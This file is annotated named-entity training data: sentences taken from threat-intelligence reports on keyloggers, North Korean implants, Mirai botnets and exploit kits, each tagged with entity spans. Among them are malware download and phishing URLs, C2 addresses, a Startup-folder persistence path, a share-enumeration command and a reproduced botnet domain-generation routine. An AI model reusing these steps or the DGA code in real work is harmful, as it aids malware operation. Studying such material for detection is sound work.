Keylogger Payload", {"entities": [[0, 5, "Malware_Name"], [6, 15, "Malware_Type"]]}], ["Snake Keylogger is a malware developed using .NET.", {"entities": [[0, 5, "Malware_Name"], [6, 15, "Malware_Type"]]}], ["Some use cases for a password cracking tool can include cracking passwords on exfil archives, auditing password requirements in internal tools, and offensive/defensive operations.", {"entities": []}], ["Source: McAfee Advanced Threat Research.", {"entities": [[8, 39, "ORG"]]}], ["Stack strings are difficult to read.", {"entities": []}], ["Starting from cmd!ExecPgm, I reviewed the disassembly of the above functions in cmd.exe to trace the origin of the command string up the call stack.", {"entities": []}], ["State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace.", {"entities": [[89, 93, "GPE"]]}], ["Sub-ctree for GetProcAddress assignment With knowledge of the sub-ctree in use, we can write a script to automatically rename all the global variables that are being assigned using this method.", {"entities": []}], ["Subscribe to Blogs Get email updates as new blog posts are added.", {"entities": []}], ["TLS traffic in Backdoor.", {"entities": [[15, 23, "Malware_Name"]]}], ["Taking Cmd of the Situation I decided to see if it would be easier to instrument cmd.exe to log commands rather than de-obfuscating the script myself.", {"entities": []}], ["Task Listing Figure 3:", {"entities": []}], ["Task Status Figure 4:", {"entities": []}], ["Testing revealed that these strings had all their environment variables expanded, which means we should be able to read the de-obfuscated commands from here.", {"entities": []}], ["The 2017 sample used address 14.140.116.172.", {"entities": []}], ["The 2018 Destover-like implant appeared in organizations in 17 countries between March 14 and March 18.", {"entities": [[4, 8, "DATE"], [73, 102, "DATE"]]}], ["The Advanced Threat Research team found this component running on systems in 11 countries.", {"entities": [[0, 28, "ORG"]]}], ["The Advanced Threat Research team uncovered activity related to this campaign in March 2018, when the actors targeted Turkish banks.", {"entities": [[0, 28, "ORG"], [81, 91, "DATE"], [118, 125, "NORP"]]}], ["The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information.", {"entities": [[4, 11, "NORP"]]}], ["The De-DOSfuscator script runs in a 64-bit Python 2 interpreter and dumps commands to both the console and a log file.", {"entities": []}], ["The Destover-like variant is 83% similar in code to a 2015 variant and contains the same rich PE header signature as the Backdoor.", {"entities": [[4, 12, "Malware_Name"], [54, 58, "DATE"]]}], ["The February implant fe887fcab66d7d7f79f05e0266c0649f0114ba7c was obtained from an unknown submitter in the United States on February 14, two days after it was compiled.", {"entities": [[4, 12, "DATE"], [104, 121, "GPE"]]}], ["The Hex-Rays SDK includes a sample, sample5, which can be used to view the current function’s ctree.", {"entities": []}], ["The PowerShell code is very simple and easy to understand.", {"entities": [[4, 14, "Software_Name"]]}], ["The SSL listener supports multiple control server connections, rather than a list of hardcoded addresses.", {"entities": []}], ["The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues.", {"entities": [[4, 9, "ORG"], [18, 22, "ORG"], [121, 148, "ORG"]]}], ["The ability to switch between disassembled and decompiled code can greatly reduce the analysis time.", {"entities": []}], ["The amount of data shown in a ctree for a function can be overwhelming.", {"entities": []}], ["The attackers behind Operation GhostSecret used a similar infrastructure to earlier threats, including SSL certificates used by FakeTLS in implants found in the Destover backdoor variant known as Escad, which was used in the Sony Pictures attack.", {"entities": [[161, 169, "Malware_Name"], [196, 201, "Malware_Name"], [225, 238, "ORG"]]}], ["The bottom line?", {"entities": []}], ["The bottom of Figure 1.2 shows the content of variable “s”, which contains the base64-encoded PowerShell code that is decoded by PowerShell.exe when it is executed.", {"entities": [[94, 104, "Software_Name"], [129, 143, "Filename"]]}], ["The code of the Snake Keylogger payload file is fully obfuscated, as shown in Figure 4.1, to protect it from being analyzed.", {"entities": [[16, 21, "Malware_Name"], [22, 31, "Malware_Type"]]}], ["The code reappeared in variants surfacing in 2017 and 2018 using nearly the same functionality and with some modifications to commands, along with an identical development environment based on the rich PE header information.", {"entities": [[45, 49, "DATE"], [54, 58, "DATE"]]}], ["The code then uses the IDA MakeName API to rename the address to the correct function.", {"entities": []}], ["The code to automatically rename all the local variables is shown in Figure 3.", {"entities": []}], ["The code works by traversing the ctree looking for calls to the GetProcAddress function.", {"entities": []}], ["The control server traffic when compared to Backdoor.", {"entities": [[44, 52, "Malware_Name"]]}], ["The decompiler (from now on referred to as Hex-Rays ) has been around for a long time and has achieved a good level of maturity.", {"entities": [[43, 51, "Software_Name"]]}], ["The decrypted .Net", {"entities": []}], ["The emails appear to be auto generated and follow the format <name>.<name><SevenNumberString>@gmx.com.", {"entities": []}], ["The executable dropper for the component was submitted from South Korea on March 19.", {"entities": [[60, 71, "GPE"], [75, 83, "DATE"]]}], ["The full name of the export function “G6doICqoMU()” is “Huzeigtmvaplpinhoo!pXfqpio3clcAoFxTnfJ.CORFgLoyRGlurYwdwIh.", {"entities": []}], ["The full path to this folder is defined in the system registry with a string value of “HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\Shell", {"entities": []}], ["The impacted organizations are in industries such as telecommunications, health, finance, critical infrastructure, and entertainment.", {"entities": []}], ["The implant is nearly identical to an unknown 2017 sample (8f2918c721511536d8c72144eabaf685ddc21a35) except that the control server addresses are different.", {"entities": []}], ["The implementation does not format the packets in standard SSL, but rather in a custom format and transmitted over SSL—hence, FakeTLS.", {"entities": []}], ["The infrastructure currently remains active.", {"entities": []}], ["The irony of BatchEncryption is that batch scripts are viewed as being easy to de-obfuscate, making binary code the safer place to hide logic from the prying eyes of network defenders.", {"entities": []}], ["The malicious macro project that contains the malicious VBA code is password protected so it cannot be viewed by the analyzer.", {"entities": []}], ["The members that can be accessed depend on its op value.", {"entities": []}], ["The nodes of this tree are either of type cinsn_t or cexpr_t .", {"entities": []}], ["The number of infected systems by country in which Proxysvc.dll was operating in March.", {"entities": [[51, 63, "Filename"], [81, 86, "DATE"]]}], ["The number of infected systems by country in which the Destover variant was operating in March.", {"entities": [[55, 63, "Malware_Name"], [89, 94, "DATE"]]}], ["The orange boxes highlight non-null pointers that got my attention during analysis, and the arrows point to the commands I used to discover their contents.", {"entities": []}], ["The payload of Snake Keylogger is just a compressed in GZIP format in the resource “Qkxkikeg” under the Resource directory “ClassLibrary1.Properties.", {"entities": [[15, 20, "Malware_Name"], [21, 30, "Malware_Type"]]}], ["The process of extracting the payload file of Snake Keylogger is a little complicated.", {"entities": [[46, 51, "Malware_Name"], [52, 61, "Malware_Type"]]}], ["The program copies the Snake Keylogger file (the downloaded \\\"Wheahmnfpgaqse.exe\\\") into this folder and renames it as “sgosr.exe”.", {"entities": [[60, 81, "Filename"], [120, 129, "Filename"]]}], ["The programs inside this folder are started when Windows starts.", {"entities": []}], ["The report outlines four commonly exploited Java vulnerabilities and maps out the step-by-step infection flow of exploits kits that leverage them.", {"entities": []}], ["The same entity hosted the control server for the Sony Pictures implants.", {"entities": [[50, 63, "ORG"]]}], ["The script comes with the latest version of flare-qdb and is installed as a Python entry point named dedosfuscator.exe.", {"entities": [[44, 53, "Software_Name"]]}], ["The server component can run on any Linux server with Docker installed.", {"entities": [[36, 41, "Operating_System"], [54, 60, "Software_Name"]]}], ["The sub-ctree for the single expression: 'dword_1000B2D8 =", {"entities": []}], ["The term \\\" critical infrastructure \\\" conjures up images of highways, electrical grids, pipelines, government facilities and utilities.", {"entities": []}], ["The term \\\"critical infrastructure\\\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \\\"Digital Pearl Harbor,\\\" \\\"Cyber 9/11,\\\" \\\"SCADA\\\" and \\\"Stuxnet.\\\" With \\\"critical infrastructure\\\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors.", {"entities": []}], ["The threat actors exploiting this crisis are not new, they are simply taking advantage of a particularly overtaxed target set that is urgently seeking new information.", {"entities": []}], ["The traditional approach to ransomware attacks predominantly relies on a “shotgun” methodology that consists of indiscriminate campaigns spreading malware to encrypt files and data from a variety of victims.", {"entities": []}], ["The type of op (ctype_t) is an enumeration where all constants are named either cit_<xyz> (for statements) or cot_<xyz> (for expressions).", {"entities": []}], ["The value data of “Startup” is C:\\\\Users\\\\{UserName}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup” by default.", {"entities": [[31, 121, "Filepath"]]}], ["Therefore, all nodes in the ctree will have the op property, which indicates the node type (variable, number, logical expression, etc.).", {"entities": []}], ["Therefore, financial crime actors are likely capable of pivoting to and deploying ransomware in OT intermediary systems to further disrupt operations.", {"entities": []}], ["These are of type cexpr_t , a large structure containing several members.", {"entities": []}], ["These correlate roughly to language keywords (if, for, do, while, return, etc.)", {"entities": []}], ["These emails had OpenDocument Presentation (.ODP) format attachments that, when opened in Microsoft PowerPoint or OpenOffice Impress, display a U.S. Small Business Administration (SBA) themed message (Figure 5) and an in-line link that redirects to an Office 365 phishing kit (Figure 6) hosted at https://tyuy56df-kind-giraffe-ok.mybluemix[.]net/. Figure 4:", {"entities": [[90, 99, "ORG"], [144, 178, "ORG"], [180, 183, "ORG"]]}], ["These emails were sent from a large pool of different @gmx.com email addresses and had password protected Microsoft Word document attachments using the file name “COVID 19 Relief.doc” (Figure 3).", {"entities": []}], ["These incidents have also resulted in significant disruptions and delays to the physical processes that enable organizations to produce and deliver goods and services.", {"entities": []}], ["These initial findings appear to be the first stage of Operation GhostSecret.", {"entities": []}], ["These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft.", {"entities": []}], ["These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions.", {"entities": []}], ["These targets were chosen intentionally to run Proxysvc because the attacker would have needed to know which systems were infected to connect to them.", {"entities": [[47, 55, "Malware_Name"]]}], ["They range from simple types such as variables, strings or numerical constants, to small code constructs (assignments, comparisons, additions, logical operations, array indexing, etc.).", {"entities": []}], ["This 165k batch file is dropped as C:\\\\Windows\\\\Temp\\\\XYNT.bat and executed by its dropper.", {"entities": [[35, 62, "Filepath"]]}], ["This Korean-language file used the control server IP address 203.131.222.83.", {"entities": []}], ["This SSL certificate has been used in Hidden Cobra operations since the Sony Pictures attack.", {"entities": [[38, 50, "Threat_Actor"], [72, 85, "ORG"]]}], ["This allows for sensitive dictionaries to be used without enabling their contents to be viewed.", {"entities": []}], ["This approach also makes it possible for the attacker to disable security processes that would normally be enough to detect known ransomware indicators or behaviors.", {"entities": [[130, 140, "Malware_Type"]]}], ["This botnet has been seen loading configuration files containing primarily U.S.- and Canada financial institution webinject targets.", {"entities": [[75, 80, "GPE"], [85, 91, "GPE"]]}], ["This campaign, dubbed Operation GhostSecret, leverages multiple implants, tools, and malware variants associated with the state-sponsored cyber group Hidden Cobra.", {"entities": [[150, 162, "Threat_Actor"]]}], ["This class has two virtual methods, visit_insn and visit_expr , that are executed when a statement or expression is found while traversing the ctree.", {"entities": []}], ["This command prints the word hai to the standard output stream but uses the right-angle bracket to redirect standard output to the NUL device, which discards all data.", {"entities": []}], ["This creates trouble for analysts when analyzing it.", {"entities": []}], ["This data also indicates this infrastructure had been operating for more than a year before its discovery.", {"entities": [[68, 84, "DATE"]]}], ["This ensures that Snake Keylogger will be started by the Windows system every time it starts.", {"entities": [[18, 23, "Malware_Name"], [24, 33, "Malware_Type"]]}], ["This file does not appear in VirusTotal as of this writing, but its dropper does (the MD5 hash is ABD0A49FDA67547639EEACED7955A01A).", {"entities": []}], ["This implant appears to be a derivative of implants authored before by Hidden Cobra and contains functionality similar to that of Bankshot, with code overlaps from other Hidden Cobra implants.", {"entities": [[71, 83, "Threat_Actor"], [130, 138, "Malware_Name"], [170, 182, "Threat_Actor"]]}], ["This implant incorporated a custom control server protocol that sends traffic over port 443.", {"entities": []}], ["This is a common technique malware uses to hide its capabilities from static analysis tools.", {"entities": []}], ["This is a technique aimed to make the analysis harder by using arrays of characters instead of strings in the code.", {"entities": []}], ["This is apparent in ransomware families such as SNAKEHOSE, which was designed to execute its payload only after stopping a series of processes that included some industrial software from vendors such as General Electric and Honeywell.", {"entities": [[48, 57, "Malware_Name"], [203, 219, "ORG"], [224, 233, "ORG"]]}], ["This is consistent with our expectations; malicious actors are typically quick to adapt their social engineering lures to exploit major flashpoints along with other recurrent events (e.g. holidays, Olympics).", {"entities": [[198, 206, "EVENT"]]}], ["This is done via a class exposed by Hex-Rays: the tree visitor ( ctree_visitor_t ).", {"entities": []}], ["This new variant resembles parts of the Destover malware, which was used in the 2014 Sony Pictures attack.", {"entities": [[40, 48, "Malware_Name"], [80, 84, "DATE"], [85, 98, "ORG"]]}], ["This produces the following output: Let’s dive a bit deeper and explain the two types of nodes: expressions and statements.", {"entities": []}], ["This represents an expansion of financial crime actors’ targeting of industries that process directly marketable information (e.g., credit card numbers or customer data) to include the monetization of production environments.", {"entities": []}], ["This server resides at Thammasat University in Bangkok, Thailand.", {"entities": [[23, 43, "ORG"], [47, 54, "GPE"], [56, 64, "GPE"]]}], ["This then causes a loading assembly failure and its assembly resolve callback function is called.", {"entities": []}], ["This variant of Snake Keylogger changes both the values of “Startup” to other folders.", {"entities": [[16, 21, "Malware_Name"], [22, 31, "Malware_Type"]]}], ["This vulnerability employed by RedKit and other exploits kits.", {"entities": []}], ["This vulnerability is used by White Lotus and other exploit kits.", {"entities": []}], ["Threat actors with varying motivations are actively exploiting the current pandemic and public fear of the coronavirus and COVID-19.", {"entities": []}], ["Thus the new implant is likely a derivative of components of Destover.", {"entities": [[61, 69, "Malware_Name"]]}], ["To allow offline use, you can supply the path to a copy of cmd.exe from your offline machine to the --getoff switch to obtain this offset.", {"entities": [[59, 66, "Filename"]]}], ["To begin, I debugged cmd.exe, set a breakpoint on CreateProcessW, and executed a program from the command prompt.", {"entities": []}], ["To decode this script while allowing the full malicious functionality to run as expected, you would have to iteratively and carefully echo and selectively execute a few hundred obfuscated SET commands.", {"entities": []}], ["Truly understanding the unique nuances of industrial sector ransomware distribution operations requires a combination of skillsets and visibility across both IT and OT systems.", {"entities": [[60, 70, "Malware_Type"]]}], ["Twenty one seconds later, the downloader then invokes a function called “Consturctor()”, as you can see in Figure 2.1.", {"entities": [[0, 24, "TIME"]]}], ["U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations.", {"entities": [[0, 4, "GPE"]]}], ["Unfortunately, although the ECHO command can “decode” each command, BatchEncryption needs the SET commands to be executed to decode future commands.", {"entities": []}], ["Users who are aware of this dynamic, and who approach any new information with cautious skepticism will be especially prepared to meet this challenge.", {"entities": []}], ["Users with NVIDIA GPUs can use NVIDIA Docker to run the worker in a container with full access to the GPUs.", {"entities": [[11, 17, "ORG"], [31, 37, "ORG"], [38, 44, "Software_Name"]]}], ["Using examples derived from our consulting engagements and threat research, we will explain how the shift to post-compromise ransomware operations is fueling adversaries’ ability to disrupt industrial operations.", {"entities": []}], ["We can create our own visitor classes by inheriting from this one and overloading the corresponding methods.", {"entities": []}], ["We determined that the implant is not a direct copy of well-known previous samples of Destover; rather, Hidden Cobra created a new hybrid variant using functionality present in earlier versions.", {"entities": [[86, 94, "Malware_Name"], [104, 116, "Threat_Actor"]]}], ["We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations.", {"entities": [[17, 21, "GPE"], [23, 28, "GPE"], [34, 45, "GPE"]]}], ["We have also uncovered additional control servers that are still active and associated with these new implants.", {"entities": []}], ["We suspect this component is involved in core control server infrastructure.", {"entities": []}], ["We will define these in a moment, but for now it is important to know that both derive from a very basic type, namely the citem_t type, as seen in the following code snippet:", {"entities": []}], ["WebClient).", {"entities": []}], ["Well-known ransomware families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now SNAKEHOSE (a.k.a.", {"entities": [[36, 44, "Malware_Name"], [46, 56, "Malware_Name"], [58, 68, "Malware_Name"], [70, 74, "Malware_Name"], [76, 80, "Malware_Name"], [90, 99, "Malware_Name"]]}], ["We’re releasing GoCrack to provide another tool for distributed teams to have in their arsenal for managing password cracking and recovery tasks.", {"entities": []}], ["We’re shipping with Dockerfile’s to help jumpstart users with GoCrack.", {"entities": []}], ["What the Captured Microsoft Excel Sample Looks Like This Excel sample, delivered as an attachment in a phishing email, contains malicious Macro VBA code.", {"entities": [[18, 27, "ORG"], [28, 33, "Software_Name"], [57, 62, "Software_Name"]]}], ["When Daniel Bohannon released his excellent DOSfuscation paper, I was fascinated to see how tricks I used as a systems engineer could help attackers evade detection.", {"entities": [[5, 20, "PERSON"]]}], ["When it starts, it sleeps 21 seconds to bypass those sandboxes with a strategy of killing a sample process when a timeout of no-action is triggered.", {"entities": [[26, 36, "TIME"]]}], ["When these documents were opened and macros enabled, they would drop and execute a .JSE script crafted to download and execute an instance of SILENTNIGHT from http://209.141.54[.]161/crypt18.dll.", {"entities": [[142, 153, "Malware_Name"]]}], ["When we compared the PE rich header data of the new February 2018 implant with a variant of Backdoor.", {"entities": [[52, 65, "DATE"], [92, 100, "Malware_Name"]]}], ["While early ransomware campaigns adopting this approach were often considered out of scope for OT security, recent campaigns targeting entire industrial and critical infrastructure organizations have moved toward adopting a more operationally complex post-compromise approach.", {"entities": []}], ["While lots of information has been shared about the victims and immediate impacts of industrial sector ransomware distribution operations, the public discourse continues to miss the big picture.", {"entities": []}], ["While these types of campaigns pose a threat to industrial production, the adoption of post-compromise deployment presents three major twists in the plot.", {"entities": []}], ["Who's up next?", {"entities": []}], ["With a wide pool of potential targets, the platform has become the vehicle of choice for quickly dispersing lucrative crimeware packages.", {"entities": [[118, 127, "Malware_Type"]]}], ["With its “write once, run anywhere” mantra, Java has drawn a horde of developers looking to serve a large user base as efficiently as possible.", {"entities": []}], ["With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets.", {"entities": []}], ["You can then supply that output as the argument to the --useoff switch in your offline machine to inform De-DOSfuscator where the function is located.", {"entities": []}], ["http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf Subscribe to Blogs Get email updates as new blog posts are added.", {"entities": []}], ["net use > shares.txt 2>errors.txt", {"entities": [[10, 20, "Filename"], [23, 33, "Filename"]]}], ["“chsg” is a new folder created by Snake Keylogger.", {"entities": []}], ["(*ptr == '", {"entities": []}], ["(https://securelist.com/synack-targeted-ransomware-uses-the-doppelganging-technique/85431/)", {"entities": []}], ["*/ if ((*ret_username = malloc(index + 1))", {"entities": []}], ["/Library/PrivateFrameworks/BluetoothManager.framework b. Private APIs used by example framework: [ BluetoothManager connectedDevices] , [BluetoothDevice name]", {"entities": []}], ["/ssh/sshd_config file to add the lines", {"entities": []}], ["1 McAfee thanks McAfee Software Engineer, Alnoor Allidina for the diligence and insight that lead to the Process Dopplegänging protection.", {"entities": [[2, 8, "ORG"], [16, 22, "ORG"], [42, 57, "PERSON"], [105, 126, "Process"]]}], ["45iHeQwQaunWXryL9YZ2egJxKvWBtWQUE4PKitu1VwYNUqkhHt6nyCTQb2dbvDRqDPXveNq94DG9uTndKcWLYNoG2uonhgH", {"entities": []}], ["76.73.80.188 76.73.80.188", {"entities": []}], ["=", {"entities": []}], ["= NULL) return (PAM_BUF_ERR); (void) strcpy(*ret_username, username); return (PAM_SUCCESS); } Figure 1:", {"entities": []}], ["A detailed description of the modules and indicators of compromise can be found in our Securelist post .", {"entities": []}], ["A path traversal vulnerability exists within the ACE format in the archiver tool WinRAR versions 5.61 and earlier that, when exploited, allows an attacker to locally execute arbitrary code.", {"entities": [[97, 101, "Version_Tag"]]}], ["A poc for this exploit was made available to the public in July, 2021.", {"entities": []}], ["A server can be quickly tested to see if it is vulnerable over SSH", {"entities": []}], ["A set of solutions now offer a more efficient iOS app deployment experience, giving app developers the ability to update their code as they see fit and deploy patches to users’ devices immediately.", {"entities": [[46, 49, "Operating_System"]]}], ["A use after free vulnerability exists within the DRMManager’s “initialize” call in Adobe Flash Player 28.0.0.137 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code.", {"entities": [[83, 88, "ORG"], [102, 112, "Version_Tag"]]}], ["A use after free vulnerability in a file package in Adobe Flash Player 31.0.0.153 and earlier that, when exploited, allows an attacker to remotely execute arbitrary code.", {"entities": [[52, 57, "ORG"], [71, 81, "Version_Tag"]]}], ["ASLR bypass The attack uses only known ASLR bypasses.", {"entities": []}], ["Acknowledgements Jeffrey Martin of Rapid7 contributed to the testing of this vulnerability.", {"entities": [[17, 31, "PERSON"], [35, 41, "ORG"]]}], ["Adobe has assigned the CVE identifier CVE-2014-0502 to this vulnerability and released a security bulletin .", {"entities": [[0, 5, "ORG"]]}], ["All three organizations are nonprofit institutions; the Peterson Institute and Smith Richardson Foundation engage in national security and public policy issues.", {"entities": [[52, 74, "ORG"], [79, 106, "ORG"]]}], ["Although the examples below are from a jailbroken device, we have demonstrated that they will work on non-jailbroken devices as well.", {"entities": []}], ["Although the upward trend applies to almost every category, we did measure a decline in new mobile malware samples following three quarters of continual growth.", {"entities": []}], ["An abbreviated version of this function is shown in Figure 1.", {"entities": []}], ["And barely two weeks later, on November 22, a sample from the MANGA malware campaign was seen actively exploiting it in the wild.", {"entities": [[4, 26, "DATE"], [31, 42, "DATE"], [62, 67, "Campaign"]]}], ["And this is certainly a high-volume business, with anywhere from a few hundred to ten thousand malicious emails sent daily – usually distributing between 50 and 500,000 emails per outbreak.", {"entities": []}], ["As an example, we tested recent malware using the technique against our detection feature with success: McAfee’s protection prevents execution of a file if changes to it are contained within a Windows NTFS transaction.", {"entities": [[201, 205, "Process"]]}], ["As it turns out, it is an updated variant of the MANGA campaign (also known as Dark) that distributes samples based on Mirai’s published source code.", {"entities": [[49, 54, "Campaign"], [79, 83, "Campaign"]]}], ["As noted in the previous reports, this bot will find HTML, PHP, JS and HTM files in the system and will inject a javascript code in every file.", {"entities": []}], ["As of this blog post, visitors to at least three nonprofit institutions — two of which focus on matters of national security and public policy — were redirected to an exploit server hosting the zero-day exploit.", {"entities": []}], ["As the first installment of this series, we look into an open source solution: JSPatch .", {"entities": []}], ["As we dissect the threat landscape for Q3, some noticeable statistics jump out of the report.", {"entities": []}], ["At line 5, it retrieves data from the backend source represented by an array of strings with an index mapping to the selected row number.", {"entities": []}], ["Attackers are in a constant race to exploit newly discovered vulnerabilities before defenders have a chance to respond.", {"entities": []}], ["Based on these and other observations, we conclude that this actor has the tradecraft abilities and resources to remain a credible threat in at least the mid-term.", {"entities": []}], ["Because Solaris 9 is no longer supported, Oracle has not released a patch.", {"entities": [[8, 15, "Operating_System"], [16, 17, "Version_Tag"], [42, 48, "ORG"]]}], ["Below we show several possibilities for performing malicious actions that are against Apple’s App Review Guidelines .", {"entities": [[86, 91, "ORG"]]}], ["Buggy Objc code without JSPatch Within the realm of Apple-provided technologies, the way to remediate this situation is to rebuild the application with updated code to fix the bug and submit the newly built app to the App Store for approval.", {"entities": [[52, 57, "ORG"]]}], ["But by breaking the exploit’s ASLR-bypass measures, they do prevent the current in-the-wild exploit from functioning.", {"entities": []}], ["But in a non-utopian world like ours, we need to assume that bad actors will leverage this technology for unintended purposes.", {"entities": []}], ["By Raj Samani on Dec 18, 2018", {"entities": [[3, 13, "PERSON"], [17, 29, "DATE"]]}], ["By exploiting recently published vulnerabilities, this malware campaign capitalizes on the gap between the time of disclosure of a vulnerability and the application of a patch to compromise IoT devices.", {"entities": []}], ["By manipulating SSH client settings to force Keyboard-Interactive authentication to prompt for the username rather than sending it through normal means, an attacker can also pass unlimited input to the PAM parse_user_name function.", {"entities": [[16, 19, "Protocol"]]}], ["C2 Commands", {"entities": []}], ["CGI.Referer.", {"entities": []}], ["CLR 2.0.50727; SV1)", {"entities": []}], ["CTS:SCO-OPNSRVR-OS-INJ HTTP:CTS:GENEXIS-PLAT-RCE HTTP:", {"entities": []}], ["CTS:TERRAMASTER-TOS-INJCTN HTTP:", {"entities": []}], ["CTS:ZEROSHELL-CGI-BIN-RCE Juniper Advanced Threat Prevention Cloud detects this bot as follows: Juniper Advanced Threat Prevention DNS Security also detects the DGA domain.", {"entities": []}], ["Campaign Details Figure 1: Attack Architecture", {"entities": []}], ["ChallengeResponseAuthentication", {"entities": []}], ["Check out our first post on zero-day vulnerabilities .", {"entities": [[28, 36, "Vulnerability"]]}], ["Code.", {"entities": []}], ["Command.", {"entities": []}], ["Compared to other recent email campaigns, Asprox uses a volume of unique samples for its campaign.", {"entities": []}], ["Compared to the previous days where malware authors used just 10-40 unique MD5s or less per day, we saw about 6400 unique MD5s sent out on May 29 th .", {"entities": [[12, 29, "DATE"], [139, 148, "DATE"]]}], ["Conclusion This threat actor clearly seeks out and compromises websites of organizations related to international security policy, defense topics, and other non-profit sociocultural issues.", {"entities": []}], ["Crashing an app is never an appealing experience for users.", {"entities": []}], ["Critical Last week, our FortiGuard Labs team encountered a malware sample that’s currently being distributed in the wild targeting TP-link wireless routers.", {"entities": [[24, 39, "ORG"]]}], ["Days 12 percent of vulnerabilities were exploited within the first week following the patch release.", {"entities": [[57, 71, "DATE"]]}], ["Decrypted original patch content retrieved from remote server", {"entities": []}], ["Default Public Key -----BEGIN PUBLIC KEY-----", {"entities": []}], ["Details of these techniques are available from our previous blog post on the subject (in the “Non-ASLR modules” section).", {"entities": []}], ["Discovery On Feb. 13, FireEye identified a zero-day Adobe Flash exploit that affects the latest version of the Flash Player (12.0.0.4 and 11.7.700.261).", {"entities": [[13, 20, "DATE"], [22, 29, "ORG"]]}], ["Domain First Seen Last Seen IP Address wmi.ns01[.]us wmi.ns01[.]us 2012-07-03 2012-07-03 2012-07-04 2012-07-04 194.183.224.75 194.183.224.75 ids.ns01[.]us ids.ns01[.]us 2012-04-23 2012-04-23 2012-05-18 2012-05-18 194.183.224.75 194.183.224.75", {"entities": [[67, 77, "DATE"], [78, 88, "DATE"], [89, 99, "DATE"], [100, 110, "DATE"], [169, 179, "DATE"], [180, 190, "DATE"], [191, 201, "DATE"], [202, 212, "DATE"]]}], ["During another earlier compromise of the same www.cdi.org website, visitors were redirected to a Java exploit test.jar (MD5 7d810e3564c4eb95bcb3d11ce191208e).", {"entities": []}], ["During our analysis, the following DGA domain was active: gtmpbeaxruxy[.]myftp.org import random counter=0 while 1: if counter>=0xFD: counter=0 counter+=1 random.seed(a=0xFAFFDED00001 + counter) DGA_DOMAIN=(''.join(random.choice('abcdefghijklmnopqoasadihcouvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randrange(10,19)))).lower()+\\\".\\\"+random.choice(['ddns.net', 'ddnsking.com', '3utilities.com', 'bounceme.net', 'freedynamicdns.net', 'freedynamicdns.org', 'gotdns.ch', 'hopto.org', 'myddns.me', 'myftp.biz', 'myftp.org', 'myvnc.com', 'onthewifi.com', 'redirectme.net', 'servebeer.com', 'serveblog.net', 'servecounterstrike.com', 'serveftp.com', 'servegame.com', 'servehalflife.com', 'servehttp.com', 'serveirc.com', 'serveminecraft.net', 'servemp3.com', 'servepics.com', 'servequake.com', 'sytes.net', 'viewdns.net', 'webhop.me', 'zapto.org'])", {"entities": []}], ["During our investigations, we discovered an exploit tool on a customer’s system and analyzed it to see how it was attacking their Solaris environment.", {"entities": [[130, 137, "Operating_System"]]}], ["E.g., ‘ 3ood3dfcqchro.ddns.net’", {"entities": []}], ["Each sample uses a default hardcoded public key shown below.", {"entities": []}], ["Encrypted patch content While the target app developer has taken steps to secure this sensitive data from prying eyes by employing Base64 encoding on top of a symmetric encryption, one can easily render this attempt futile by running a few commands through Cycript .", {"entities": []}], ["Episode 1.", {"entities": []}], ["Exactly five years ago, in October 2016, our solutions first encountered a Trojan named Trickbot (aka TrickLoader or Trickster).", {"entities": [[8, 22, "DATE"], [27, 39, "DATE"]]}], ["Example public framework : /System/Library/Frameworks/Accounts.framework b .", {"entities": []}], ["Execution TP-Link.", {"entities": []}], ["Executive Summary FireEye Labs has been tracking a recent spike in malicious email detections that we attribute to a campaign that began in 2013.", {"entities": [[140, 144, "DATE"]]}], ["Exfiltration/Communication", {"entities": []}], ["Exploit kits are the epitome of this economy, affording anyone the opportunity to easily and cheaply enter the digital crime business.", {"entities": []}], ["Exploitation After Patch Release While the majority of the observed vulnerabilities were zero-days, 42 percent of vulnerabilities were exploited after a patch had been released.", {"entities": [[89, 98, "Vulnerability"]]}], ["Exploitation timing for patched vulnerabilities ranges from within hours of patch issuance to years after initial disclosure Case Studies We continue to observe espionage and financially motivated groups quickly leveraging publicly disclosed vulnerabilities in their operations.", {"entities": [[67, 72, "TIME"]]}], ["Exploiting a New Vulnerability This Mirai-based botnet campaign is referred to as MANGA because of the token string it used to include in its SSH/telnet commands.", {"entities": [[36, 41, "Malware_Name"], [82, 87, "Campaign"]]}], ["Fallout almost certainly had a bearing on the spread of GandCrab, the leading ransomware.", {"entities": [[56, 64, "Malware_Name"]]}], ["Figure 1.", {"entities": []}], ["Figure 10 shows the outcome of executing the private API [ACAccountStore allAccountTypes], which outputs 36 account types on the test device .", {"entities": []}], ["Figure 10.", {"entities": []}], ["Figure 11 is an example of one of the more recent phishing attempts.", {"entities": []}], ["Figure 11 shows the code for loading the BluetoothManager.framework and utilizing APIs to read and change the states of Bluetooth of the host device.", {"entities": []}], ["Figure 12 Malware Payload Icon Evasion", {"entities": []}], ["Figure 1: Percentage of vulnerabilities exploited at various times in relation to patch release FireEye Mandiant Threat Intelligence analyzed 60 vulnerabilities that were either exploited or assigned a CVE number between Q1 2018 to Q3 2019.", {"entities": [[96, 103, "ORG"], [104, 132, "ORG"]]}], ["Figure 2 Email Sample Figure 3 Email Headers Some of the recurring campaign that Asporox used includes themes focused around airline tickets, postal services and license keys.", {"entities": []}], ["Figure 2 below represents a sample message while Figure 3 is an example of the various court-related email headers used in the campaign.", {"entities": []}], ["Figure 2 illustrates the number of days between when a patch was made available and the first observed exploitation date for each vulnerability.", {"entities": []}], ["Figure 2 shows the standard way of setting up JSPatch in an iOS app.", {"entities": [[60, 63, 